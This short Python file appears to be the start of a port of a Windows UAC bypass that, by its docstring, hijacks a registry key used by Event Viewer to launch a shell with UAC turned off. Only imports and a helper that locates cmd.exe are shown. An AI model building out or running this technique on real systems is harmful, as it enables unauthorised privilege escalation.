"""

https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1

Bypasses Windows UAC by hijacking a special key in the Registry and inserting a custom command that will get invoked when
the Windows Event Viewer is launched. It will spawn a second shell that has the UAC flag turned off.

"""

#imports
import os
import sys
import time
import _winreg
import win32api
import win32con

#cmd path
def cmd_path():
	path = "c:/windows/system32/cmd.exe"
	
	if os.path.isfile(os.path.join(path)) == True:
		return os.path.join(path)
	else:
		return False
